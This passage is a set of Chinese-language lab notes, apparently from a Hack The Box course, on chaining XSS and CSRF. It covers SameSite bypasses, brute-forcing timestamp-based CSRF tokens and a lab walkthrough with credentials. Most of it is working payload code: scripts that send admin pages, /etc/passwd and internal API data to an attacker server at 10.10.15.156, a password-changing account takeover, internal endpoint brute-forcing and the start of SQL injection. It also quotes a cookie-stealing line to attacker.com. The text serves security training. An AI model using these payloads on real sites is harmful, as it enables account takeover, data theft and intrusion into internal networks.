<p>有趣的是，网页应用在成功登录后会将我们重定向到一个临时页面，然后该页面又重定向到我们的个人资料：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415202651.png" alt="Pasted image 20260415202651" />
<p>查看源代码，我们可以看到由此产生的重定向是通过 HTML <code>meta</code>标签实现的，这是一种客户端重定向：</p>
<p>此外，我们可以通过<code>user</code>的 GET 参数向 URL 注入额外的 GET 参数，因为 Web 应用似乎在重定向 URL 中复制了该参数：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415203605.png" alt="Pasted image 20260415203605" />
<p>用户配置文件存在几节前讨论的 CSRF 漏洞，使我们可以通过 <code>/profile.php？promote=htb-stdnt</code> 端点推广用户。然而，由于 SameSite 属性设置为<code>严格</code> ，我们之前的负载无法正常工作。相反，我们可以利用客户端重定向来设计成功的 CSRF 漏洞利用。为此，我们必须确保受害者能够访问终端，从而实现客户端重定向。此外，受害者需要被重定向到包含 <code>promote=htb-stdnt</code> GET 参数的 URL 来将用户提升为管理员权限。我们可以通过类似以下载荷实现：</p>
<pre><code class="language-html">&lt;script&gt;
document.location = "https://vulnerablesite.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";
&lt;/script&gt;</code></pre>
<p>将该有效载荷设置为我们的漏洞利用并传递给受害者，成功执行 CSRF 攻击。随后，我们获得了网页应用的管理员权限。</p>
<p>最后，由于子域名被视为 SameSite，我们可以利用子域名中的 XSS 漏洞绕过 SameSite cookie 的限制。在这种情况下，交叉来源请求被视为 SameSite。因此，受害者的 Cookie 会随请求一起发送，从而成功实施 CSRF 攻击。我们将在后续章节中更详细探讨这一情景。</p>
<p>查看我们的示例网页应用，可以看到它在会话 cookie 上设置<code>SameSite=Strict</code> 属性，防止 Cookie 通过任何跨站请求发送：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415203729.png" alt="Pasted image 20260415203729" />
<p>然而，正如我们之前讨论的，子域名被视为同一网站的一部分。因此，让我们尝试识别可能受到 XSS 影响的子域名。我们可以用 <code>gobuster</code> 来实现：</p>
<pre><code>Chenduoduo@htb[/htb]$ gobuster vhost -k -u https://vulnerablesite.htb -w /path/to/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

&lt;SNIP&gt;
===============================================================
2023/08/26 12:09:40 Starting gobuster in VHOST enumeration mode
===============================================================
Found: guestbook.vulnerablesite.htb (Status: 200) [Size: 2317]
                                                              
===============================================================
2023/08/26 12:09:43 Finished
===============================================================</code></pre>
<p>通过查看子域名 <code>https://guestbook.vulnerablesite.htb</code>，我们可以识别出几节前提到的留言簿网页应用。我们可以确认，同样的 XSS 漏洞依然存在：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415203947.png" alt="Pasted image 20260415203947" />
<p>假设监控留言簿条目的管理员也在 <code>https://vulnerablesite.htb</code> 登录主应用程序，我们可以利用该 XSS 漏洞绕过 SameSite 限制，让管理员将我们的用户晋升为管理员。为此，我们需要强制管理员用户发送相应的 POST 请求，这可以通过以下 XSS 负载实现：</p>
<pre><code class="language-html">&lt;script&gt;
    var csrf_req = new XMLHttpRequest();
    var params = 'promote=htb-stdnt';
    csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params);
&lt;/script&gt;
</code></pre>
<p>在将我们的负载发布到留言簿并等待管理员用户访问页面几秒钟后，我们可以看到 CSRF 攻击成功，我们的用户已被晋升：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415204018.png" alt="Pasted image 20260415204018" />
<h3>弱 Token 爆破</h3>
<p>正如<code>Session Security</code>模块中简要讨论的，弱 CSRF 令牌可以通过绕过以成功发动 CSRF 攻击。当 CSRF 令牌未绑定到用户会话时，可以进行简单绕过。在这种情况下，攻击者访问受损的网络应用时，可以从自己的会话向交叉源请求添加有效的 CSRF 令牌。后端随后会接受来自受害者会话的交叉起始请求，因为 CSRF 令牌有效。另一个例子是 CSRF 代币并非完全随机，使其可预测。根据 CSRF 令牌的创建方式（比如用户名的哈希值或当前时间戳），我们可能能一次性猜测，或者用有效载荷暴力破解。</p>
<p>这一次，网页应用已用 CSRF 令牌保护，因此普通的 CSRF 攻击将不再成功。然而，如果我们获得多个 CSRF 令牌，可以推断这是一个递增的数字，可能类似于计数器，因此可以暴力破解：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260415204116.png" alt="Pasted image 20260415204116" />
<p>如果我们更仔细地分析 CSRF tokens，可以发现 CSRF 代币仅仅是作为 Unix 时间戳的当前时间。这使得 CSRF 令牌具有可预测性，并允许我们创建可行的漏洞来执行 CSRF 攻击。为此，我们必须正确猜测受害者的 CSRF 令牌，即受害者在访问我们的有效载荷前最后一次访问 <code>/profile.php</code> 端点的时间。由于默认 SameSite <code>Lax</code> 策略的限制，我们无法用 JavaScript 代码动态暴力破解 CSRF 令牌，因此很难精确掌握时机。因此，我们需要在 HTML 表单中硬编码猜测的 CSRF 令牌，并更新每个猜测的值：</p>
<pre><code class="language-html">&lt;html&gt;
  &lt;body&gt;
    &lt;form method="GET" action="https://vulnerablesite.htb/profile.php"&gt;
      &lt;input type="hidden" name="promote" value="htb-stdnt" /&gt;
      &lt;input type="hidden" name="csrf" value="1692981700" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>虽然这使得暴力破解 CSRF 令牌更具挑战性，从而降低了成功攻击的可能性，但预测有效的 CSRF 令牌并绕过弱保护是可行的。</p>
<ol><li>先加 hosts：</li></ol>
<pre><code>echo '10.129.66.205 misc-csrf.htb exploitserver.htb' | sudo tee -a /etc/hosts</code></pre>
<ol><li>登录：</li></ol>
<pre><code>https://misc-csrf.htb/login.php  
user: htb-stdnt  
pass: Academy_student!</code></pre>
<ol><li>这题的绕过点不是普通跨站直接打 <code>/profile.php</code>，而是利用 <strong>客户端重定向</strong> 绕过 <code>SameSite=Strict</code>。课程材料里给的思路就是：让受害者先访问一个会发生<strong>客户端重定向</strong>的端点，并把 <code>promote=htb-stdnt</code> 注入到最终跳转的 URL 里，这样后续请求会被当成 SameSite，请求里会带上管理员 cookie，从而完成 CSRF。</li></ol>
<ol><li>在 exploit server 的 <code>/exploit</code> 里保存这个 payload：</li></ol>
<pre><code>&lt;script&gt;  
document.location = "https://misc-csrf.htb/admin.php?user=htb-stdnt%26promote=htb-stdnt";  
&lt;/script&gt;</code></pre>
<ol><li>然后打开：</li></ol>
<pre><code>https://exploitserver.htb/deliver</code></pre>
<p>选择目标：</p>
<pre><code>misc-csrf.htb</code></pre>
<p>点 <code>Deliver</code>。</p>
<ol><li>等几秒，再回：</li></ol>
<pre><code>https://misc-csrf.htb/profile.php</code></pre>
<p>权限已经变成 admin。</p>
<h2>XSS 利用</h2>
<p>我们可以利用跨站脚本 (XSS) 漏洞发起 HTTP 请求，获取其响应，并将数据泄露到我们控制的服务器。因此，我们可以精心构造 XSS 攻击载荷，发起跨域请求，并将 XSS 与 CSRF 攻击载荷结合使用，从而实施一种对受害者所在内部网络构成威胁的攻击技术。</p>
<p>此外，如果未显式设置 SameSite 属性，Web 浏览器通常会强制执行 cookie 的 SameSite 策略，这<code>Lax</code>大大限制了 CSRF 攻击的可能性。因此，将 XSS 和 CSRF 结合起来是一种强大的攻击技术。</p>
<p><strong>HTTPOnly Cookie flag</strong> 窃取受害者会话 Cookie 是威胁行为者利用 XSS 漏洞最广泛利用的手段。然而，通过使用会话 cookie 上的 <code>HttpOnly</code> 属性，可以防止这种技术。该属性阻止 JavaScript 代码访问该 Cookie。 更具体地说，如果我们访问 <code>document.cookie</code>，带有 <code>HTTPOnly</code> 属性的 Cookie 将不存在，这实际上防止了受害者会话 cookie 被窃取。然而，这并不一定减轻 XSS 漏洞的严重性。由于 XSS 允许我们在受害者的浏览器中，在易受攻击的网络应用中执行任意 JavaScript 代码，并且在受害者的上下文中，我们可以执行与知道会话 Cookie 相同的操作。然而，我们需要编写一个 XSS 负载来代表我们执行相应的操作，而不是在浏览器中设置受害者会话 Cookie 后手动操作。</p>
<p><strong>Exfiltrating Data with XSS</strong></p>
<p>XSS攻击的payload是在受害者浏览器或用户环境中执行, 使得攻击者可以获得从受害者视角访问的数据. 低权限攻击者可以利用XSS漏洞获取对受害者应用的管理访问权想, 前提是受害者有管理权限. 我们可以利用这一点, 从网页应用中窃取任意数据.</p>
<p>为了访问受害者上下文中的信息并将信息泄露到我们的泄露服务器，我们可以使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest" target="_blank" rel="noreferrer">XMLHttpRequest</a> 对象，这使我们能够发送 HTTP 请求并与响应互动。</p>
<p>我们的示例网页应用是我们之前见过的同款留言簿应用。同样的 XSS 漏洞依然存在。不过这次，会话 Cookie 设置了 <code>HTTPOnly</code> 标志，防止我们窃取：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418042747.png" alt="Pasted image 20260418042747" />
<blockquote>设置了<code>HttpOnly</code>的Cookie, 不能被<code>document.cookie</code>读取, 不能被任何前端JS访问.</blockquote>
<blockquote>例如, 常见的窃取方式是XSS, <code>new Image().src="http://attacker.com/?c="+document.cookie</code></blockquote>
<blockquote><code>HttpOnly</code>阻断的是从浏览器脚本到Cookie的读取路径.</blockquote>
<p>假设受害者是管理员，我们应从他们的视角审视网页应用，以确定其中是否有仅对管理员可见的功能。为此，让我们访问受害者上下文中已知的端点，并对我们的撤资服务器进行响应。为此，我们可以在留言簿中创建包含以下 XSS 有效载荷的条目：</p>
<pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们可以利用漏洞利用服务器来写入 XSS 负载。我们将使用一个简单的有效载荷，访问 <code>/home.php</code> 端点并将 base64 编码的响应导出给窃取服务器：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>等待受害者触发我们的负载后，我们将在撤离服务器收到 base64 编码的响应：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
10.129.136.40 - - [30/Nov/2025 12:36:37] "OPTIONS /log HTTP/1.1" 200 -
10.129.136.40 - - [30/Nov/2025 12:36:37] [i] POST body: {"data":"CjwhRE&lt;SNIP&gt;Ww+"}
10.129.136.40 - - [30/Nov/2025 12:36:37] "POST /log HTTP/1.1" 200 -</code></pre>
<p>解码响应后，我们可以分析它是否与低权限用户在 <code>/home.php</code> 端点访问的内容有差异。我们可以发现，在回复的导航部分，/<code>admin.php</code> 有对管理员仪表盘的引用，但在我们用户的上下文中没有：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418043458.png" alt="Pasted image 20260418043458" />
<p>让我们通过调整漏洞服务器的负载，将/<code>admin.php</code> 端点改为窃取，从而窃取管理员仪表盘，包括任何潜在敏感数据：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>我们不会在留言簿上发布新条目，因为管理员会定期访问留言簿，每次都会触发我们的 XSS 负载。由于这会触发从漏洞利用服务器加载的有效载荷代码，修改利用代码即可。这使我们能够提取整个管理仪表盘，包括管理员访问的所有信息：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418043537.png" alt="Pasted image 20260418043537" />
<pre><code class="language-js"># 创建一个新的http请求对象
var xhr = new XMLHttpRequest();
# 请求方法, 访问路径, 异步请求(发请求时不会卡住整个页面, 请求完成后执行回调函数) 
xhr.open('GET', '/admin.php', true);
# 让浏览器在这个请求里自动带上当前站点的凭据(Cookie, session, 认证信息等)
xhr.withCredentials = true;

# 定义一个回调函数, onload, 表示加载完成时触发
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    # 因为接下来发送的内容是JSON格式, 所以需要定义Content-Type
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p><code>exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));</code></p>
<ul><li><code>xhr.responseTest</code>: 表示前面那个<code>xhr</code>请求拿到的响应正文, 也就是admin.php返回的html内容</li><li><code>btoa()</code>: 进行base64编码</li><li><code>JSON.stringify(...)</code>: 把上面的 JS 对象转成 JSON 字符串。例如变成：<code>{"data":"QWxhZGRpbjpvcGVuIHNlc2FtZQ=="}</code></li><li><code>exfil.send(...)</code>: 执行发送命令</li></ul>
<h2>从受害者会话发起攻击</h2>
<p>在讨论如何从带有 XSS 漏洞的受害者用户上下文中窃取数据后，我们将探讨如何触发可能改变状态的操作。由于 XSS 赋予我们对受害者会话的完全控制，我们可以在受害者用户上下文中触发网页应用实现的任何功能。这可能导致受害者账户被完全接管，或助长进一步攻击。</p>
<p><strong>账户接管</strong> 这一次，我们的示例网页应用包含了更新用户资料的功能，包括用户密码：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418060231.png" alt="Pasted image 20260418060231" />
<p>更新配置文件通过以下 HTTP 请求实现：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418152825.png" alt="Pasted image 20260418152825" />
<p>由于更新账户密码不需要使用旧密码，我们可以利用已知的 XSS 漏洞更改受害者的密码。这使我们能够登录受害者的账户，从而完全接管他们的账户。表单通过 CSRF_token保护，但由于存在 XSS 漏洞，我们可以读取 CSRF 令牌并将其添加到请求中。</p>
<p>为此，我们使用之前章节中使用的同样的 XSS 漏洞，从漏洞服务器加载 JavaScript 代码：</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们可以向 <code>/home.php</code> 发送 GET 请求，获取有效的 CSRF 令牌，提取它，然后发起 POST 请求，将受害者的密码改为 <code>pwned</code>。</p>
<pre><code class="language-js">// GET CSRF token
var xhr = new XMLHttpRequest();
xhr.open('GET', '/home.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf_token').value);

// change PW
var csrf_req = new XMLHttpRequest();
var params = \`username=admin&amp;email=admin@vulnerablesite.htb&amp;password=pwned&amp;csrf_token=\${csrftoken}\`;
csrf_req.open('POST', '/home.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);</code></pre>
<p>等待管理员用户触发 XSS 后，我们可以用 <code>admin:pwned</code> 的凭证登录受害者账户。</p>
<p><strong>链式漏洞, Chaining Vulnerabilities</strong> 如上所述，我们可以利用 XSS 漏洞，从受害者的用户上下文中触发 Web 应用中的任何功能。我们可以更进一步，通过利用 Web 应用中只有受害者能访问的端点上的不同漏洞，串联多个漏洞。</p>
<p>为此，我们首先需要从受害者的角度分析网络应用，识别受害者能够访问但我们自己账户无法访问的端点，最后，通过我们的 XSS 负载测试和利用发现的任何漏洞。</p>
<p>我们将再次使用与利用服务器上自定义漏洞利用的基础 XSS 负载相同的内容：</p>
<pre><code>&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>从受害者的用户上下文中窃取 <code>/home.php</code> 端点会暴露出端点/<code>admin.php</code>，而我们的用户无法访问：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418153117.png" alt="Pasted image 20260418153117" />
<p>为了识别管理员端点显示的数据，我们可以使用上一节中使用的相同负载来导出响应：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>这揭示了以下 HTML 回复：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418153143.png" alt="Pasted image 20260418153143" />
<p>分析 HTML 源代码后，管理员端点似乎支持 GET 参数<code>视图</code> ，可以设置到当前工作目录中的不同文件。这是本地文件包含（LFI）漏洞的明显切入点。为了验证我们的假设，让我们调整载荷以包含文件 <code>/etc/passwd</code>：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php?view=../../../../etc/passwd', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>等待受害者再次触发 XSS 漏洞后，我们收到以下对撤离服务器的回复，其中包含我们泄露的文件：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418153219.png" alt="Pasted image 20260418153219" />
<blockquote><strong>注：</strong> 我们可以将 HTML 代码保存到本地文件中，并在网页浏览器中打开以显示页面。我们可能需要泄露更多文件，比如脚本文件或样式表，以正确渲染页面。</blockquote>
<h2>枚举内部 API</h2>
<p>正如我们所见，我们可以利用 XSS 漏洞在受害者的用户上下文中触发特定功能，并窃取受害者有权访问的数据。然而，由于 XSS 有效载荷是在受害者的浏览器中执行的，因此它也使我们能够攻击仅在受害者私有网络内可访问的其他 Web 应用程序。</p>
<p><strong>识别内部API</strong> 我们的攻击将以与前几节相同的方式开始。我们将首先把基础 XSS 有效载荷作为留言簿条目发布：</p>
<pre><code class="language-html">&lt;script src="https://exploitserver.htb/exploit"&gt;&lt;/script&gt;</code></pre>
<p>之后，我们将提取管理员端点，以识别可能对管理员有用的功能：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>由此可得出以下结论：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418154643.png" alt="Pasted image 20260418154643" />
<p>正如我们所见，管理端点会从 API 加载额外信息<code>https://api.internal-apis.htb/</code>。但是，如果我们尝试访问该 API，则会被阻止，这表明该 API 只能从受害者的本地网络访问：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418154701.png" alt="Pasted image 20260418154701" />
<p>因此，我们必须调整 XSS 有效载荷，以便枚举受害者浏览器中的 API。</p>
<p><strong>枚举内部API</strong> 首先，我们来提取管理员端点中泄露的端点<code>/v1/sessions</code>。我们可以通过相应地调整 XSS 有效载荷来实现这一点：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
xhr.withCredentials = true;
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>更新有效载荷并等待一段时间后，我们没有收到有关数据泄露服务器的更多数据，这表明出了问题。</p>
<p>由于我们与不同源的 API 通信，同源策略会阻止我们访问响应，除非 API 实现了相应的 CORS 标头来绕过同源策略。由于管理端点从 API 跨域获取数据，我们可以假设 API 已配置 CORS，允许我们访问响应。但是，如果我们更仔细地分析获取数据的客户端 JavaScript 代码，我们会发现对函数的调用<code>fetch</code>没有<code>credentials: 'include'</code>设置 CORS 属性。另一方面，我们<code>withCredentials</code>在有效负载中显式地设置了该属性。如果 API 没有通过设置<code>Access-Control-Allow-Credentials</code>CORS 标头来允许这种做法，则无法绕过同源策略，并会抛出 CORS 错误，从而阻止我们访问响应。为了绕过这个问题，我们需要匹配泄露的调用中设置的参数<code>fetch</code>，并在不提供凭据的情况下发送请求：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', true);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>这表明我们需要完全匹配内部 API 所期望的配置，以避免 CORS 问题。由于我们无法直接访问 API，因此无法通过识别响应中设置的 CORS 标头来分析 CORS 配置，我们需要从泄露的 HTML 代码中复制配置，该代码实现了与内部 API 的通信。CORS 错误会阻止后续语句的执行。因此，建议使用一个<code>try-catch</code>代码块来识别正确的 CORS 配置，以便导出响应，从而更轻松地调试有效负载（请注意，<code>async</code>调用中的参数<code>xhr.open</code>设置为<code>false</code>）：</p>
<pre><code class="language-js">try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'https://api.internal-apis.htb/v1/sessions', false);
    xhr.withCredentials = true;
    xhr.send();
    var msg = xhr.responseText;
} catch (error) {
    var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("POST", "https://10.10.15.156:4443/log", true);
exfil.setRequestHeader("Content-Type", "application/json");
exfil.send(JSON.stringify({data: btoa(msg)}));</code></pre>
<p>这将导致以下信息被泄露，表明我们的 HTTP 请求出现了问题，从而使我们能够调整请求的配置以匹配 CORS 配置：</p>
<pre><code class="language-txt">NetworkError: Failed to execute 'send' on 'XMLHttpRequest': Failed to load 'https://api.internal-apis.htb/v1/sessions'.</code></pre>
<p>此外，内部 API 可能需要使用身份验证持有者而非 Cookie 进行身份验证。我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage" target="_blank" rel="noreferrer">localStorage</a>属性访问存储在受害者本地存储中的身份验证持有者（在存在漏洞的 Web 应用程序上下文中）。然后，我们可以使用<a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/setRequestHeader" target="_blank" rel="noreferrer">setRequestHeader</a><code>Authorization</code>函数设置请求头。<code>XMLHttpRequest</code></p>
<blockquote><strong>注意：</strong> 如果您没有收到预期的数据，请记住可能是 CORS 配置存在问题或缺少身份验证。</blockquote>
<p>经过适当修改以避免 CORS 错误后，我们收到了来自外泄服务器的数据，然后我们可以对其进行解码：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ echo -n eyJzZXNzaW9ucyI6W3siYWdlbnQiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA5LjAuNTQxNC4xMjAgU2FmYXJpLzUzNy4zNiIsInRpbWUiOiIxNjkxNjQ1NzMxIiwidXNlciI6ImFkbWluIn0seyJhZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMDkuMC41NDE0LjEyMCBTYWZhcmkvNTM3LjM2IiwidGltZSI6IjE2OTI1OTYxMzEiLCJ1c2VyIjoiYWRtaW4ifSx7ImFnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwOS4wLjU0MTQuMTIwIFNhZmFyaS81MzcuMzYiLCJ0aW1lIjoiMTY5MzIwMDkzMSIsInVzZXIiOiJhZG1pbiJ9XX0K | base64 -d | jq

{
  "sessions": [
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1691645731",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1692596131",
      "user": "admin"
    },
    {
      "agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
      "time": "1693200931",
      "user": "admin"
    }
  ]
}</code></pre>
<p>由于数据中不包含任何有价值的信息，我们进一步枚举 API 以识别其他端点。我们可以通过在 XSS 有效载荷中实现目录暴力破解来识别其他端点，该破解会将所有现有端点泄露到泄露服务器。我们将基于<a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/api/objects-lowercase.txt" target="_blank" rel="noreferrer">objects-lowercase.txt</a>字典进行概念验证<code>SecLists</code>。有效载荷将向每个端点发送请求，然后通过检查状态码来确定端点是否有效。我们可以使用类似于以下的有效载荷来实现这一点：</p>
<pre><code class="language-js">var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];

for (i in endpoints){
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', \`https://api.internal-apis.htb/v1/\${endpoints[i]}\`, false);
        xhr.send();
        
        if (xhr.status != 404){
            var exfil = new XMLHttpRequest();
            exfil.open("POST", "https://10.10.15.156:4443/log", true);
            exfil.setRequestHeader("Content-Type", "application/json");
            exfil.send(JSON.stringify({data: btoa(endpoints[i])}));
        }
    } catch {
        // do nothing
    }
}</code></pre>
<p>这会将现有的 API 端点泄露到泄露服务器，然后我们可以对其进行进一步分析：</p>
<pre><code class="language-shell">Chenduoduo@htb[/htb]$ python3 server.py 

Serving HTTPS on 0.0.0.0 port 4443 (https://0.0.0.0:4443/) ...
10.129.136.40 - - [30/Nov/2025 13:06:44] "OPTIONS /log HTTP/1.1" 200 -
10.129.136.40 - - [30/Nov/2025 13:06:44] [i] POST body: {"data":"YWNjb3VudHM="}</code></pre>
<p>泄漏出来的API端点为:<code>users</code>. 然后更新payload:</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://api.internal-apis.htb/v1/users', true);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.15.156:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<h2>利用内部 Web 应用程序（一）</h2>
<p><strong>识别漏洞</strong></p>
<p>我们将从前几节中使用的相同的 XSS 攻击载荷和<code>/admin.php</code>端点数据外泄开始。这里我们将省略这部分内容，因为我们已经在前几节中讨论过相应的攻击载荷。 当受害者触发 XSS 漏洞时，响应会被泄露到泄露服务器。我们可以看到，管理端点包含对内部 Web 应用程序的引用<code>https://internal.internal-webapps-1.htb</code>：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418161718.png" alt="Pasted image 20260418161718" />
<p>如果我们尝试直接访问该页面，则会被阻止：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418161726.png" alt="Pasted image 20260418161726" />
<p>因此，让我们利用 XSS 漏洞枚举 Web 应用程序，就像我们在上一节中对内部 API 所做的那样。我们将首先提取 Web 应用程序的索引：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://internal.internal-webapps-1.htb/', false);
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
    exfil.setRequestHeader("Content-Type", "application/json");
    exfil.send(JSON.stringify({data: btoa(xhr.responseText)}));
};
xhr.send();</code></pre>
<p>结果显示，内部 Web 应用程序受到身份验证保护，因为索引包含一个登录表单：</p>
<img src="assets/posts/advanced-xss-csrf/Pasted image 20260418161829.png" alt="Pasted image 20260418161829" />
<p>XSS漏洞允许我们与内部Web应用程序进行完全交互。我们可以尝试使用默认密码或暴力破解其他端点。但是，本节将重点介绍SQL注入漏洞。我们可以从登录表单构造一个有效的登录POST请求，该请求会被内部Web应用程序接受。让我们尝试一个简单的SQL注入，发送一个包含单引号的用户名：</p>
<pre><code class="language-js">var xhr = new XMLHttpRequest();
var params = \`uname=\${encodeURIComponent("'test")}&amp;pass=x\`;
xhr.open('POST', 'https://internal.internal-webapps-1.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = () =&gt; {
    var exfil = new XMLHttpRequest();
    exfil.open("POST", "https://10.10.14.144:4443/log", true);
